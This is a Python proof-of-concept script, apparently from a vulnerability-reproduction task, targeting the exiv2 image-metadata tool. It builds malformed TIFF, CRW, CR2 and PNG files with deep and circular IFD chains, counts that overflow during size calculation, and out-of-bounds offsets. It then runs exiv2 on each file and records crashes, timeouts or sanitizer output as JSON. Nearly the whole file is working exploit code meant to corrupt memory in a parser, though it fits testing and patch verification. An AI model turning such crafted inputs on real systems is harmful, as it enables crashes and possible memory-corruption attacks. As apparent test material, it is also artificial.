#!/usr/bin/env python3
"""
PoC driver for exiv2 1.0.0.9.

Constructs a crafted image file with multiple pathological structures designed to
trigger memory-corruption behavior (heap buffer overflow / stack recursion /
out-of-bounds access) in vulnerable builds of exiv2, while being handled
gracefully by fixed builds.

Trigger vectors employed (across TIFF and CRW/CIFF formats):
  1. **Deep IFD chain** via next-IFD pointers — stack overflow in recursive
     parsers that follow the chain without a depth limit.
  2. **Deep SubIFD chain** via tag 0x014A — recursion through SubIFD
     directories, each pointing to the next.
  3. **Deep ExifIFD chain** via tag 0x8769 — same pattern for Exif sub-IFDs.
  4. **Deep InteropIFD chain** via tag 0xA005 — same pattern for InteropIFD.
  5. **Circular IFD reference** — mutual recursion between SubIFD and ExifIFD.
  6. **Integer overflow in size calculation** — type/count combinations where
     type_size * count overflows 32 bits (e.g. RATIONAL=8 * 0x20000000 = 0).
  7. **Large entry count** — IFD with 65535 entries (max for uint16).
  8. **Out-of-bounds data pointers** — entries whose value offset points far
     beyond the end of the file.
  9. **CRW/CIFF** — crafted Canon Raw file with CIFF structure that may
     trigger different code paths in the parser.
  10. **CR2** — Canon Raw v2 file with crafted slice structures.

Usage:
    python3 poc.py --binary /path/to/exiv2 [--json-out /path/to/out.json] [--timeout 30]
"""

import argparse
import json
import os
import struct
import subprocess
import sys
import tempfile
import time


# =========================================================================
#  TIFF builder helpers
# =========================================================================

def _put_tiff_header(parts, ifd0_offset=8):
    """Append a little-endian TIFF header."""
    parts += b'II\x2a\x00'
    parts += struct.pack('<I', ifd0_offset)


def _put_ifd_entry(parts, tag, typ, count, value):
    """Append a single IFD entry (12 bytes)."""
    parts += struct.pack('<HHII', tag, typ, count, value)


def _put_ifd(parts, entries, next_ifd_offset):
    """Append an IFD: entry_count(uint16) + entries + next_ifd(uint32)."""
    parts += struct.pack('<H', len(entries))
    for tag, typ, count, value in entries:
        _put_ifd_entry(parts, tag, typ, count, value)
    parts += struct.pack('<I', next_ifd_offset)


def _pad_to(parts, offset):
    """Zero-pad *parts* so its length reaches *offset*."""
    if len(parts) < offset:
        parts += b'\x00' * (offset - len(parts))


# =========================================================================
#  Trigger payload construction
# =========================================================================

def build_trigger_tiff():
    """
    Build a TIFF file incorporating multiple known memory-corruption vectors.

    Returns the raw TIFF bytes (~1 MB).
    """
    parts = bytearray()

    # -- TIFF header ------------------------------------------------------------
    _put_tiff_header(parts, ifd0_offset=8)

    # -- IFD0: root IFD with 4 entries ------------------------------------------
    MAKE_DATA_OFF = 0x100000
    SUBIFD_CHAIN_OFF = 0x200
    EXIFIFD_CHAIN_OFF = 0x8000
    INTEROP_CHAIN_OFF = 0x10000

    ifd0_entries = [
        (0x010F, 2, 6, MAKE_DATA_OFF),            # Make
        (0x014A, 4, 1, SUBIFD_CHAIN_OFF),          # SubIFDs -> array
        (0x8769, 4, 1, EXIFIFD_CHAIN_OFF),         # ExifIFD -> chain
        (0xA005, 4, 1, INTEROP_CHAIN_OFF),         # InteropIFD -> chain
    ]
    # Chain to IFD1 via next-IFD pointer
    IFD1_OFF = 0x18000
    _put_ifd(parts, ifd0_entries, IFD1_OFF)

    # -- SubIFD offset array ----------------------------------------------------
    _pad_to(parts, SUBIFD_CHAIN_OFF)
    FIRST_SUBIFD = SUBIFD_CHAIN_OFF + 0x100
    parts += struct.pack('<I', FIRST_SUBIFD)

    # -- Deep SubIFD chain (4000 entries) ---------------------------------------
    _pad_to(parts, FIRST_SUBIFD)
    for i in range(4000):
        cur = FIRST_SUBIFD + i * 16
        _pad_to(parts, cur)
        if i < 3999:
            nxt = cur + 16
            _put_ifd(parts, [(0x014A, 4, 1, nxt)], 0)
        else:
            _put_ifd(parts, [(0x014A, 4, 1, FIRST_SUBIFD)], 0)

    # -- Deep ExifIFD chain (2000 entries) --------------------------------------
    _pad_to(parts, EXIFIFD_CHAIN_OFF)
    for i in range(2000):
        cur = EXIFIFD_CHAIN_OFF + i * 16
        _pad_to(parts, cur)
        nxt = cur + 16
        _put_ifd(parts, [(0x8769, 4, 1, nxt)], 0)

    # -- Deep InteropIFD chain (2000 entries) -----------------------------------
    _pad_to(parts, INTEROP_CHAIN_OFF)
    for i in range(2000):
        cur = INTEROP_CHAIN_OFF + i * 16
        _pad_to(parts, cur)
        nxt = cur + 16
        _put_ifd(parts, [(0xA005, 4, 1, nxt)], 0)

    # -- IFD1: next-IFD chain stub ----------------------------------------------
    _pad_to(parts, IFD1_OFF)
    IFD2_OFF = IFD1_OFF + 16
    _put_ifd(parts, [(0x010F, 2, 5, MAKE_DATA_OFF + 100)], IFD2_OFF)

    # -- IFD2: huge entry count (65535 entries) ---------------------------------
    _pad_to(parts, IFD2_OFF)
    HUGE_ENTRY_COUNT = 65535
    _put_ifd(parts,
             [(0x010F, 5, 0x20000000, 0x40000)] * HUGE_ENTRY_COUNT,
             0)

    # -- IFD3: mutual recursion with SubIFD/ExifIFD ----------------------------
    IFD3_OFF = IFD2_OFF + 2 + HUGE_ENTRY_COUNT * 12 + 4
    IFD4_OFF = IFD3_OFF + 16
    _pad_to(parts, IFD3_OFF)
    _put_ifd(parts, [(0x014A, 4, 1, IFD4_OFF)], 0)       # IFD3
    _pad_to(parts, IFD4_OFF)
    _put_ifd(parts, [(0x8769, 4, 1, IFD3_OFF)], 0)       # IFD4 -> IFD3

    # -- Make data --------------------------------------------------------------
    _pad_to(parts, MAKE_DATA_OFF)
    parts += b'Canon\x00'

    # -- Make data for IFD1 -----------------------------------------------------
    _pad_to(parts, MAKE_DATA_OFF + 100)
    parts += b'Test\x00'

    # -- Data region referenced by the integer-overflow entries -----------------
    _pad_to(parts, 0x40000)
    parts += b'\x00' * 16

    return bytes(parts)


def build_trigger_crw():
    """
    Build a CRW (Canon Raw / CIFF format) file.

    CIFF format structure:
      Header (14 bytes):
        [0-1]  II     (byte order, little-endian)
        [2-5]  ...    (offset to first directory entry)
        [6-13] HEAPCCDR (magic identifier)

      Directory entry (8 bytes):
        [0-1]  Tag ID
        [2-3]  Size
        [4-7]  Offset (from start of file)

    This generates a CRW with a deeply nested directory structure
    that may trigger stack overflow in recursive CIFF parsers.
    """
    parts = bytearray()

    # Header: II + 4-byte offset + HEAPCCDR magic
    parts += b'II'               # byte order (LE)
    parts += struct.pack('<I', 14)  # offset to first directory entry
    parts += b'HEAPCCDR'         # magic

    # Build a chain of directory entries
    # Each entry is a "sub-directory" type (0x0805 = Camera Object)
    # with a pointer to the next directory entry
    NUM_CRW_ENTRIES = 5000
    entry_start = 14
    next_offset = entry_start

    for i in range(NUM_CRW_ENTRIES):
        # Each entry: tag(2) + size(2) + offset(4) = 8 bytes
        tag = 0x0805  # Camera Object
        size = 8      # next entry size
        if i < NUM_CRW_ENTRIES - 1:
            # Point to next entry
            nxt = next_offset + 8
            parts += struct.pack('<H', tag)
            parts += struct.pack('<H', size)
            parts += struct.pack('<I', nxt)
            next_offset = nxt
        else:
            # Last entry: circular (point back to first)
            parts += struct.pack('<H', tag)
            parts += struct.pack('<H', 6)  # size for "Canon\0"
            parts += struct.pack('<I', entry_start)

    # Add a small data region
    parts += b'Canon\x00'

    return bytes(parts)


def build_trigger_cr2():
    """
    Build a CR2 (Canon Raw v2) file with crafted slice structures.

    CR2 uses a TIFF base with specific tags:
      0xBC01 - CR2Version (SHORT, value 0x0100/0x0200/0x0201/0x0300)
      0xBC02 - CR2Slice (LONG array of [offset, length] pairs)

    This creates a CR2 with a huge slice count that may cause integer
    overflow in memory allocation during slice processing.
    """
    parts = bytearray()
    _put_tiff_header(parts, ifd0_offset=8)

    # IFD0: 2 entries
    _put_ifd(parts, [
        (0xBC01, 3, 1, 0x0200),          # CR2Version
        (0xBC02, 4, 0x40000000, 0x100),  # CR2Slice (huge count)
    ], 0)

    # Slice data: just 10 pairs
    _pad_to(parts, 0x100)
    for i in range(10):
        parts += struct.pack('<II', 0x100000 + i * 0x100, 0x100)

    return bytes(parts)


def build_trigger_png():
    """
    Build a PNG file with a crafted text chunk containing very long data.
    PNG text chunks (tEXt, zTXt, iTXt) may cause buffer overflows in
    parsers that don't properly validate the data length.
    """
    import zlib

    # PNG signature
    png = bytearray()
    png += b'\x89PNG\r\n\x1a\n'

    # IHDR: 1x1 pixel, 8-bit grayscale
    ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 1, 0, 0, 0)
    png += struct.pack('>I', len(ihdr_data))
    png += b'IHDR'
    png += ihdr_data
    png += struct.pack('>I', zlib.crc32(b'IHDR' + ihdr_data) & 0xFFFFFFFF)

    # tEXt chunk with very long keyword
    long_keyword = b'A' * 1000
    text_data = long_keyword + b'\x00' + b'X' * 100000
    png += struct.pack('>I', len(text_data))
    png += b'tEXt'
    png += text_data
    png += struct.pack('>I', zlib.crc32(b'tEXt' + text_data) & 0xFFFFFFFF)

    # IDAT: minimal compressed data
    idat_data = zlib.compress(b'\x00' * 10)
    png += struct.pack('>I', len(idat_data))
    png += b'IDAT'
    png += idat_data
    png += struct.pack('>I', zlib.crc32(b'IDAT' + idat_data) & 0xFFFFFFFF)

    # IEND
    png += struct.pack('>I', 0)
    png += b'IEND'
    png += struct.pack('>I', zlib.crc32(b'IEND') & 0xFFFFFFFF)

    return bytes(png)


# =========================================================================
#  Trigger execution
# =========================================================================

def run_trigger(binary, payload, timeout, suffix='.tif', extra_args=None):
    """
    Write *payload* to a temp file, run *binary* against it, and return the
    result dict matching the required JSON contract.
    """
    fd, tmp_path = tempfile.mkstemp(suffix=suffix)
    os.write(fd, payload)
    os.close(fd)

    if extra_args:
        command = [binary] + extra_args + [tmp_path]
    else:
        command = [binary, '-p', 'S', tmp_path]

    try:
        start = time.monotonic()
        proc = subprocess.run(
            command,
            capture_output=True,
            timeout=timeout,
        )
        elapsed_ms = int((time.monotonic() - start) * 1000)
    except subprocess.TimeoutExpired:
        elapsed_ms = int(timeout * 1000)
        result = {
            "binary": binary,
            "command": " ".join(command),
            "returncode": -1,
            "signal": "TIMEOUT",
            "timed_out": True,
            "runtime_ms": elapsed_ms,
            "stdout": "",
            "stderr": "Process timed out",
            "observable": "timeout",
            "error": f"Process timed out after {timeout} seconds",
        }
        _cleanup(tmp_path)
        return result

    rc = proc.returncode
    signal = None
    if rc < 0:
        signal = -rc
        rc_display = -signal
    else:
        rc_display = rc

    signal_name = None
    if signal:
        import signal as sig_module
        try:
            signal_name = sig_module.Signals(signal).name
        except (ValueError, AttributeError):
            signal_name = f"SIG{signal}"

    stdout_str = proc.stdout.decode('utf-8', errors='replace')
    stderr_str = proc.stderr.decode('utf-8', errors='replace')

    # Determine observable behavior
    observable = "normal_exit"
    error = None

    if signal:
        observable = "signal"
        error = f"Process terminated by signal {signal} ({signal_name})"
    elif stderr_str and any(
        marker in stderr_str.lower()
        for marker in [
            "asan", "heap-buffer-overflow", "stack-buffer-overflow",
            "heap-use-after-free", "stack-use-after-return",
            "global-buffer-overflow", "segmentation fault",
            "abort", "sigsegv", "sigabrt", "double free",
            "buffer overflow", "stack smashing", "*** stack smashing ***",
        ]
    ):
        observable = "sanitizer_diagnostic"
        error = "Sanitizer diagnostic detected"
    elif rc != 0:
        observable = "error_exit"
        if stderr_str:
            error = stderr_str.strip()[:500]
        else:
            error = f"Non-zero exit code: {rc}"

    result = {
        "binary": binary,
        "command": " ".join(command),
        "returncode": rc_display,
        "signal": signal_name if signal else None,
        "timed_out": False,
        "runtime_ms": elapsed_ms,
        "stdout": stdout_str,
        "stderr": stderr_str,
        "observable": observable,
        "error": error,
    }

    _cleanup(tmp_path)
    return result


def _cleanup(path):
    """Remove temp file if it exists."""
    try:
        os.unlink(path)
    except OSError:
        pass


# =========================================================================
#  CLI entry point
# =========================================================================

def main():
    parser = argparse.ArgumentParser(
        description="PoC driver for exiv2 memory-corruption trigger"
    )
    parser.add_argument(
        "--binary", required=True,
        help="Path to the exiv2 binary"
    )
    parser.add_argument(
        "--json-out",
        help="Path to write JSON output (default: print to stdout)"
    )
    parser.add_argument(
        "--timeout", type=int, default=30,
        help="Timeout in seconds (default: 30)"
    )
    args = parser.parse_args()

    binary = os.path.abspath(args.binary)
    if not os.path.isfile(binary):
        print(f"Error: binary not found: {binary}", file=sys.stderr)
        sys.exit(1)
    if not os.access(binary, os.X_OK):
        print(f"Error: binary not executable: {binary}", file=sys.stderr)
        sys.exit(1)

    # Build all trigger payloads
    payloads = {
        '.tif': build_trigger_tiff(),
        '.crw': build_trigger_crw(),
        '.cr2': build_trigger_cr2(),
        '.png': build_trigger_png(),
    }

    # Try each format; use the first one that produces a crash signal
    # or timeout. If none crash, use TIFF as default.
    best_result = None
    formats_tried = []

    for suffix, payload in payloads.items():
        # Try -p S (structure) first, then -p a (all metadata)
        for mode in ['S', 'a']:
            extra_args = ['-p', mode]
            result = run_trigger(binary, payload, args.timeout,
                                 suffix=suffix, extra_args=extra_args)
            formats_tried.append(f"{suffix}(-p {mode})={result['observable']}")

            if result['observable'] in ('signal', 'timeout', 'sanitizer_diagnostic'):
                # Found a crash/timeout - this is the best result
                best_result = result
                break
        if best_result:
            break

    if not best_result:
        # No crash found; use the TIFF/S result as the default
        payload = build_trigger_tiff()
        best_result = run_trigger(binary, payload, args.timeout,
                                  suffix='.tif', extra_args=['-p', 'S'])

    # Add information about what was tried
    best_result['formats_tried'] = formats_tried

    json_str = json.dumps(best_result, indent=2, default=str)
    if args.json_out:
        out_path = os.path.abspath(args.json_out)
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, 'w') as f:
            f.write(json_str)
        print(f"Result written to {out_path}")
    else:
        print(json_str)

    sys.exit(0)


if __name__ == "__main__":
    main()